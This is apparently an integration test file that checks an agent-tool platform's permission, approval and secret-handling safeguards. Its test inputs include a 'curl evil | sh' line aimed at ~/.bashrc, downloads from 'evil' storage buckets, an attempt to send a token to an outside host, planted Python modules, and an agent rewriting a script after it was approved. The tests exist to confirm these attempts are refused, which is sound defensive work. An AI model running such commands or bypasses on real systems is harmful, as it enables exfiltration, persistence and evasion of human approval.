"""E2E 3 (M2, §21.2 Integration row): the security regression suite, through real processes on loopback.

Machine "home" (HIVE_HOME ``home``, HOME ``user``): hub ``sec-hub`` and node ``safe`` (preset ``cautious``, direct
link from the hub). The node daemon runs with ``~/bin`` on its PATH (a PATH directory under ``~``), ``work/pylib``
on its ``sys.path`` (PYTHONPATH, inside an rw root) and the parent of the interpreter's stdlib as an extra rw root,
so the "Hive's own interpreter / import path" rules are exercised on real paths. Tokens on ``safe``: ``this-pc``
(the generated cautious agent token), ``ro`` (readonly), the owner; secret ``HF_TOKEN`` (default HF hosts).

Machine "pod" (HIVE_HOME ``pod``): node ``strict`` joined as a relay node, ``policy.exec.mode = "allowlist"``.

Hub agents: ``filer`` (role files), ``op`` (operator); a ``models`` token for the gateway; a node-level ``models``
token on ``safe``.

Drills (the §21.2 list): readonly token sees no mutating tools and node.info shows secret names, not values;
net.http with ``auth_env=HF_TOKEN`` to a non-HF host → ``policy_denied secret_host``; cautious shell.run →
approval_required, a 30 m grant lets the next shell.run through; ~/.bashrc unwritable for the cautious token;
fs.write into a service's code (denied) + service.restart → approval_required; docker preset with volume ``~``
refused; models tokens cannot call /v1/call; the interpreter's ``site.py`` and a PATH dir under ``~`` unwritable;
first-hop net.download to a storage bucket host denied; a ``files`` hub agent cannot write ~/.bashrc through the hub
(direct and relay links); the cautious token cannot write into a vLLM venv's site-packages; a planted ``json.py`` in
a ``sys.path`` dir is refused; an operator token cannot write ~/.bashrc on an allowlist-mode node; approve-then-
rewrite of ``run.sh`` ends in ``conflict`` without running; a file containing a secret cannot be copied with
fs_transfer.
"""
from __future__ import annotations

import json
import os
import re
import shutil
import sys
import sysconfig
import tempfile
import unittest
from pathlib import Path
from typing import Any, Dict, List, Optional

from hive import dist, proctree, util
from hive import client as hclient
from hive.errors import HiveError

from tests import helpers
from tests.integration import m2util
from tests.integration.m2util import IS_WINDOWS, ROOT, Supervisor, http, http_json, run_cli, wait_for
from tests.test_mcp import McpProc

HF_SECRET = "hf_e2e3SecretValue0123456789abcdef"


def out(r: dict) -> str:
    """shell.run output (merged by default, or stdout)."""
    return (r.get("output") if r.get("output") is not None else r.get("stdout") or "").strip()

# §17.2 filtering: fs_op stays with op enum ["stat"]; fs_transfer stays (its fs.read_chunk side is allowed; every
# node-side write_chunk is refused), so they are checked separately
MUTATING_TOOLS = ("shell_run", "job_start", "job_stop", "fs_write", "fs_edit", "service_define", "service_control",
                  "model_pull", "net_download", "proc_kill", "http_request", "model_chat")
# call_action stays too: it reaches only the actions the identity may call (read actions here)
FAKE_DOCKER = "#!/bin/sh\necho 'Docker version 27.0.0, build fake'\nexit 0\n"


@unittest.skipIf(IS_WINDOWS, "POSIX E2E (the Windows variant runs in the lead's Windows CI)")
class TestE2E3Security(unittest.TestCase):

    @classmethod
    def setUpClass(cls) -> None:
        cls.base = Path(tempfile.mkdtemp(prefix="hivee3-")).resolve()
        cls.home, cls.user, cls.work = cls.base / "home", cls.base / "user", cls.base / "work"
        cls.pod_home, cls.pod_user = cls.base / "pod", cls.base / "pod-user"
        cls.sysbin = cls.base / "sysbin"                  # outside every root: a trusted PATH dir with a fake docker
        for d in (cls.home, cls.user, cls.work, cls.pod_home, cls.pod_user, cls.sysbin, cls.user / "bin",
                  cls.work / "pylib"):
            d.mkdir(parents=True, exist_ok=True)
        (cls.sysbin / "docker").write_text(FAKE_DOCKER, encoding="utf-8")
        os.chmod(str(cls.sysbin / "docker"), 0o755)
        pypath = os.pathsep.join([str(ROOT)] + ([os.environ["PYTHONPATH"]] if os.environ.get("PYTHONPATH") else []))
        cls.env = m2util.base_env(HIVE_HOME=str(cls.home), HOME=str(cls.user), PYTHONPATH=pypath)
        cls.node_env = dict(cls.env, PYTHONPATH=pypath + os.pathsep + str(cls.work / "pylib"),
                            PATH=os.pathsep.join([str(cls.user / "bin"), str(cls.sysbin), os.environ.get("PATH", "")]))
        cls.pod_env = m2util.base_env(HIVE_HOME=str(cls.pod_home), HOME=str(cls.pod_user), PYTHONPATH=pypath)
        cls.stdlib_parent = Path(sysconfig.get_paths()["stdlib"]).resolve().parent
        cls.sups: List[Supervisor] = []
        cls.pids: List[int] = []
        try:
            cls._setup()
        except BaseException:
            cls.tearDownClass()
            raise

    @classmethod
    def cli(cls, *argv: str, env: Optional[Dict[str, str]] = None, stdin: Optional[str] = None) -> Any:
        return run_cli(argv, env=env or cls.env, stdin=stdin)

    @classmethod
    def ok(cls, r: Any, what: str) -> str:
        if r.returncode != 0:
            raise AssertionError(f"{what} failed ({r.returncode}): {r.stdout}{r.stderr}")
        return r.stdout

    @staticmethod
    def token_of(out: str) -> str:
        return re.search(r"^(hv_[A-Za-z0-9_-]+)$", out, re.M).group(1)

    @classmethod
    def _setup(cls) -> None:
        cls.hub_port, cls.node_port = helpers.free_port(), helpers.free_port()
        cls.hub_url, cls.node_url = f"http://127.0.0.1:{cls.hub_port}", f"http://127.0.0.1:{cls.node_port}"
        cls.ok(cls.cli("init", "hub", "--yes", "--name", "sec-hub", "--listen", f"127.0.0.1:{cls.hub_port}"),
               "init hub")
        m2util.allow_root(cls.home / "hub" / "config.json")
        cls.ok(cls.cli("init", "node", "--yes", "--name", "safe", "--preset", "cautious", "--listen",
                       f"127.0.0.1:{cls.node_port}", "--root", str(cls.work), "--root", str(cls.stdlib_parent),
                       "--proxy", "off", "--mirror", "none"), "init node")
        m2util.allow_root(cls.home / "node" / "config.json")
        cls.cautious = (cls.home / "tokens" / "this-pc.token").read_text(encoding="utf-8").strip()
        cls.owner = (cls.home / "tokens" / "this-pc-owner.token").read_text(encoding="utf-8").strip()
        cls.ro = cls.token_of(cls.ok(cls.cli("node", "token", "add", "ro", "--role", "readonly"), "token add ro"))
        cls.ok(cls.cli("node", "secret", "set", "HF_TOKEN", stdin=HF_SECRET + "\n"), "secret set")
        cls.node_models = cls.token_of(cls.ok(cls.cli("gateway", "token", "add", "app", "--models", "*", "--node"),
                                              "gateway token add --node"))
        out = cls.ok(cls.cli("hub", "add-node", "safe", "--direct", cls.node_url, "--generate"), "add-node direct")
        line = [ln.strip() for ln in out.splitlines() if ln.strip().startswith("hive node token add")]
        cls.ok(cls.cli(*line[0].split()[1:]), "node token add --kind hub")
        out = cls.ok(cls.cli("hub", "add-node", "strict", "--relay", "--host", "10.255.0.1"), "add-node relay")
        code = dist.decode_join(re.search(r"HIVE_JOIN='(hvj1\.[A-Za-z0-9_-]+=*)'", out).group(1))
        code["u"] = cls.hub_url
        cls.filer = cls.token_of(cls.ok(cls.cli("hub", "add-agent", "filer", "--role", "files", "--nodes", "*"),
                                        "add-agent files"))
        cls.op = cls.token_of(cls.ok(cls.cli("hub", "add-agent", "op", "--role", "operator", "--nodes", "*"),
                                     "add-agent operator"))
        cls.hub_models = cls.token_of(cls.ok(cls.cli("gateway", "token", "add", "chat", "--models", "*/*", "--hub"),
                                             "gateway token add --hub"))
        # the node first: the hub probes direct links every 30 s, so a first probe that raced the node's start would
        # leave the row offline for that long (§8.3)
        cls.start("safe", [sys.executable, "-m", "hive", "node", "run"], cls.node_env)
        wait_for(lambda: http_json("GET", cls.node_url + "/v1/health", timeout=2)[1]["result"]["role"] == "node",
                 60, what="node health")
        cls.start("hub", [sys.executable, "-m", "hive", "hub", "run"], cls.env)
        wait_for(lambda: http_json("GET", cls.hub_url + "/v1/health", timeout=2)[1]["result"]["role"] == "hub", 60,
                 what="hub health")
        wait_for(lambda: http_json("GET", cls.node_url + "/v1/health", timeout=2)[1]["result"]["role"] == "node",
                 60, what="node health")
        # the relay node: join, then switch its exec policy to allowlist mode before it runs
        cls.ok(cls.cli("join", "--yes", "--no-pod", env=dict(cls.pod_env, HIVE_JOIN=dist.encode_join(code))), "join")
        m2util.allow_root(cls.pod_home / "node" / "config.json")
        def strict_cfg(d: dict) -> None:
            d["policy"]["exec"]["mode"] = "allowlist"
            d["listen"]["port"] = helpers.free_port()       # join keeps the default 7701 (parallel test runs)
        m2util.edit_json(cls.pod_home / "node" / "config.json", strict_cfg)
        cls.start("strict", [sys.executable, "-m", "hive", "node", "run"], cls.pod_env)
        wait_for(lambda: cls.hub_rows().get("strict", {}).get("online") and cls.hub_rows()["safe"].get("online"),
                 120, what="nodes online at the hub")

    @classmethod
    def start(cls, name: str, argv: List[str], env: Dict[str, str]) -> None:
        cls.sups.append(Supervisor(argv, env=env, cwd=str(ROOT), log=cls.base / f"{name}.log", name=name).start())

    @classmethod
    def hub_rows(cls) -> Dict[str, dict]:
        c = hclient.connect(cls.hub_url, token=cls.op)
        try:
            return {n["name"]: n for n in c.nodes()}
        finally:
            c.close()

    @classmethod
    def tearDownClass(cls) -> None:
        for sup in getattr(cls, "sups", []):
            if sup.running:
                sup.kill()
        for pid in getattr(cls, "pids", []):
            if pid and util.pid_alive(pid):
                try:
                    proctree.kill_tree(pid, force=True, grace=1)
                except Exception:  # noqa: BLE001
                    pass
        if os.environ.get("HIVE_TEST_KEEP"):
            print("kept", cls.base)
        else:
            shutil.rmtree(str(cls.base), ignore_errors=True)

    # -----------------------------------------------------------------------------------------------------------
    def setUp(self) -> None:
        self.clients: List[Any] = []

    def tearDown(self) -> None:
        for c in self.clients:
            c.close()

    def connect(self, url: str, token: str) -> Any:
        c = hclient.connect(url, token=token)
        self.clients.append(c)
        return c

    def node(self, token: str) -> Any:
        return self.connect(self.node_url, token)

    def hub(self, token: str) -> Any:
        return self.connect(self.hub_url, token)

    def err(self, fn: Any, code: str, rule: Optional[str] = None) -> HiveError:
        with self.assertRaises(HiveError) as cm:
            fn()
        e = cm.exception
        self.assertEqual(e.code, code, f"{e.code}: {e.message} {e.details}")
        if rule is not None:
            self.assertEqual(e.details.get("rule"), rule, f"{e.message} {e.details}")
        return e

    def approve(self, approval_id: str, *extra: str) -> None:
        r = self.cli("approvals", "approve", approval_id, "--node", "--yes", *extra)
        self.assertEqual(r.returncode, 0, r.stdout + r.stderr)

    # -----------------------------------------------------------------------------------------------------------
    def test_01_prompt_injection_drill(self) -> None:
        """A readonly token sees no mutating tools (HTTP and MCP stdio) and node.info shows secret names only."""
        st, body = http_json("GET", self.node_url + "/v1/tools?profile=full", token=self.ro)
        self.assertEqual(st, 200, body)
        names = {t["name"] for t in body["result"]["tools"]}
        self.assertIn("fs_read", names)
        self.assertFalse(names & set(MUTATING_TOOLS), names)
        fs_op = [t for t in body["result"]["tools"] if t["name"] == "fs_op"][0]
        self.assertEqual(fs_op["inputSchema"]["properties"]["op"]["enum"], ["stat"])
        tokfile = self.base / "ro.token"
        tokfile.write_text(self.ro + "\n", encoding="utf-8")
        p = McpProc([], env=dict(self.env, HIVE_URL=self.node_url, HIVE_TOKEN_FILE=str(tokfile)))
        try:
            p.send({"jsonrpc": "2.0", "id": 0, "method": "initialize",
                    "params": {"protocolVersion": "2025-06-18", "capabilities": {},
                               "clientInfo": {"name": "e2e3", "version": "1"}}})
            p.recv(0, timeout=60)
            p.send({"jsonrpc": "2.0", "method": "notifications/initialized"})
            p.send({"jsonrpc": "2.0", "id": 1, "method": "tools/list"})
            mcp_names = {t["name"] for t in p.recv(1)["result"]["tools"]}
        finally:
            p.close()
        self.assertIn("fs_read", mcp_names)
        self.assertFalse(mcp_names & set(MUTATING_TOOLS), mcp_names)
        info = self.node(self.ro).call("node.info")
        text = json.dumps(info)
        self.assertIn("HF_TOKEN", text)
        self.assertNotIn(HF_SECRET, text)
        self.err(lambda: self.node(self.ro).call("fs.write", {"path": str(self.work / "x.txt"), "content": "x"}),
                 "forbidden")

    def test_02_secret_host(self) -> None:
        port = helpers.free_port()
        e = self.err(lambda: self.node(self.cautious).call(
            "net.http", {"url": f"http://127.0.0.1:{port}/collect", "auth_env": "HF_TOKEN"}), "policy_denied",
            "secret_host")
        self.assertNotIn(HF_SECRET, json.dumps(e.to_dict() if hasattr(e, "to_dict") else e.details))

    def test_03_approval_then_grant(self) -> None:
        """approve-then-rewrite of run.sh → conflict without running; then a 30 m grant for shell.run."""
        c = self.node(self.cautious)
        marker = self.work / "ran.txt"
        script = self.work / "run.sh"
        script.write_text(f"echo approved > {marker}\n", encoding="utf-8")
        cmd = f"sh {script}"
        e = self.err(lambda: c.call("shell.run", {"command": cmd}), "approval_required")
        ap = e.details["approval_id"]
        self.assertTrue(re.match(r"^ap_[A-Za-z0-9_-]{6,40}$", ap), ap)
        self.assertEqual(e.details.get("where"), "node:safe")
        self.approve(ap)
        # the agent rewrites the approved script before running it
        c.call("fs.write", {"path": str(script), "content": f"echo rewritten > {marker}\n"})
        e = self.err(lambda: c.call("shell.run", {"command": cmd}, approval_id=ap), "conflict")
        self.assertFalse(marker.exists(), "the rewritten script ran")
        # a plain approval: once
        e = self.err(lambda: c.call("shell.run", {"command": "echo once"}), "approval_required")
        self.approve(e.details["approval_id"])
        r = c.call("shell.run", {"command": "echo once"}, approval_id=e.details["approval_id"])
        self.assertEqual(out(r), "once")
        self.err(lambda: c.call("shell.run", {"command": "echo once"}, approval_id=e.details["approval_id"]),
                 "forbidden")                                  # single use
        # a 30 m grant: the next, different shell.run goes through without an approval id
        e = self.err(lambda: c.call("shell.run", {"command": "echo first"}), "approval_required")
        self.approve(e.details["approval_id"], "--for", "30m")
        r = c.call("shell.run", {"command": "echo first"}, approval_id=e.details["approval_id"])
        self.assertEqual(out(r), "first")
        r = c.call("shell.run", {"command": "echo granted"})
        self.assertEqual(out(r), "granted")
        # still policy-checked; other cautious actions still wait
        self.err(lambda: c.call("fs.delete", {"path": str(script)}), "approval_required")
        r = self.cli("approvals", "revoke", "--all", "--node")
        self.assertEqual(r.returncode, 0, r.stdout + r.stderr)
        self.err(lambda: c.call("shell.run", {"command": "echo again"}), "approval_required")

    def test_04_exec_paths(self) -> None:
        """Paths that make code run later are unwritable for the cautious token; Hive's own interpreter and import
        path for everyone."""
        c = self.node(self.cautious)
        self.err(lambda: c.call("fs.write", {"path": "~/.bashrc", "content": "curl evil | sh\n"}), "policy_denied",
                 "exec_path")
        self.assertFalse((self.user / ".bashrc").exists())
        self.err(lambda: c.call("fs.write", {"path": "~/bin/ls", "content": "#!/bin/sh\n"}), "policy_denied",
                 "exec_path")
        site_py = Path(sysconfig.get_paths()["stdlib"]).resolve() / "site.py"   # §5.4 step 4 is lexical
        original = site_py.read_text(encoding="utf-8")       # identical bytes: harmless even if a check regressed
        for tok in (self.cautious, self.owner):
            self.err(lambda: self.node(tok).call("fs.write", {"path": str(site_py), "content": original}),
                     "policy_denied", "hive_internal")
        venv = self.work / "venvs" / "vllm"
        sp = venv / "lib" / "python3.12" / "site-packages" / "vllm"
        sp.mkdir(parents=True)
        (venv / "pyvenv.cfg").write_text("home = /usr/bin\n", encoding="utf-8")
        (sp / "__init__.py").write_text("", encoding="utf-8")
        self.err(lambda: c.call("fs.write", {"path": str(sp / "__init__.py"), "content": "import os\n"}),
                 "policy_denied", "exec_path")
        for tok in (self.cautious, self.owner):
            self.err(lambda: self.node(tok).call("fs.write", {"path": str(self.work / "pylib" / "json.py"),
                                                              "content": "raise SystemExit\n"}),
                     "policy_denied", "hive_internal")
        self.assertFalse((self.work / "pylib" / "json.py").exists())
        # an ordinary file in the same root is fine
        c.call("fs.write", {"path": str(self.work / "notes.txt"), "content": "ok\n"})

    def test_05_service_code_and_restart(self) -> None:
        own = self.node(self.owner)
        code = self.work / "svc"
        code.mkdir()
        (code / "app.py").write_text("import time\nwhile True:\n    time.sleep(1)\n", encoding="utf-8")
        st = own.call("service.define", {"name": "app", "argv": [sys.executable, str(code / "app.py")],
                                          "cwd": str(code), "wait": 10})
        self.pids += [p for p in [st.get("pid")] if p]
        c = self.node(self.cautious)
        self.err(lambda: c.call("fs.write", {"path": str(code / "app.py"), "content": "import os; os.system('x')\n"}),
                 "policy_denied", "exec_path")
        self.err(lambda: c.call("service.restart", {"name": "app"}), "approval_required")
        self.err(lambda: c.call("service.start", {"name": "app"}), "approval_required")
        own.call("service.remove", {"name": "app", "wait": 20})

    def test_06_docker_volume_home(self) -> None:
        e = self.err(lambda: self.node(self.owner).call(
            "service.define", {"name": "dk", "preset": "docker", "preset_args": ["image=alpine", "volume=~:/home"],
                               "start": False}), "policy_denied")
        # "~" holds Hive's data and the user's secrets: refused as a protected/secret-holding tree
        self.assertIn(e.details.get("rule"), ("contains_denied", "fs_deny", "volume"), e.details)
        self.assertIn(str(self.user), e.message)

    def test_07_models_tokens_no_call(self) -> None:
        body = {"action": "node.info", "params": {}}
        st, res = http_json("POST", self.node_url + "/v1/call", token=self.node_models, body=body)
        self.assertEqual(st, 403, res)
        st, res = http_json("POST", self.hub_url + "/v1/call", token=self.hub_models, body=dict(body, node="safe"))
        self.assertEqual(st, 403, res)
        st, res = http_json("GET", self.hub_url + "/v1/nodes", token=self.hub_models)
        self.assertEqual(st, 403, res)

    def test_08_first_hop_bucket(self) -> None:
        c = self.node(self.cautious)
        for url in ("https://evil-bucket.oss-cn-hangzhou.aliyuncs.com/x?d=secret",
                    "https://raw.githubusercontent.com/evil/x/main/y", "https://evil.s3.amazonaws.com/x"):
            self.err(lambda: c.call("net.download", {"url": url, "path": str(self.work / "dl.bin")}),
                     "policy_denied")
        self.assertFalse((self.work / "dl.bin").exists())

    def test_09_hub_agents(self) -> None:
        """A files hub agent cannot write ~/.bashrc through the hub (direct and relay link); an operator cannot
        write it on an allowlist-mode node; a file holding a secret cannot be fs_transfer'ed."""
        filer = self.hub(self.filer)
        for node, home in (("safe", self.user), ("strict", self.pod_user)):
            self.err(lambda: filer.call("fs.write", {"path": "~/.bashrc", "content": "evil\n"}, node=node),
                     "policy_denied", "exec_path")
            self.assertFalse((home / ".bashrc").exists())
            filer.call("fs.write", {"path": "~/plain.txt", "content": "fine\n"}, node=node)
            self.assertEqual((home / "plain.txt").read_text(encoding="utf-8"), "fine\n")
        op = self.hub(self.op)
        self.err(lambda: op.call("fs.write", {"path": "~/.bashrc", "content": "evil\n"}, node="strict"),
                 "policy_denied", "exec_path")
        self.assertFalse((self.pod_user / ".bashrc").exists())
        op.call("fs.write", {"path": "~/.profile.d-ok.txt", "content": "x\n"}, node="strict")
        # a file containing a node secret value cannot be copied through Hive
        leak = self.work / "leak.env"
        leak.write_text(f"HF={HF_SECRET}\n", encoding="utf-8")
        with self.assertRaises(HiveError) as cm:
            op.transfer(f"safe:{leak}", "strict:~/leak.env")
        self.assertIn("secret", cm.exception.message.lower())
        self.assertFalse((self.pod_user / "leak.env").exists())
        self.assertFalse(any(HF_SECRET in p.read_text(encoding="utf-8", errors="replace")
                             for p in self.pod_user.rglob("*") if p.is_file()))
        tk = op.toolkit()
        try:
            r = tk.call("fs_transfer", {"src": f"safe:{leak}", "dst": "strict:~/leak2.env"})
        finally:
            tk.close()
        self.assertTrue(r.is_error, r.text)
        self.assertNotIn(HF_SECRET, r.text)
        self.assertFalse((self.pod_user / "leak2.env").exists())


if __name__ == "__main__":
    unittest.main()
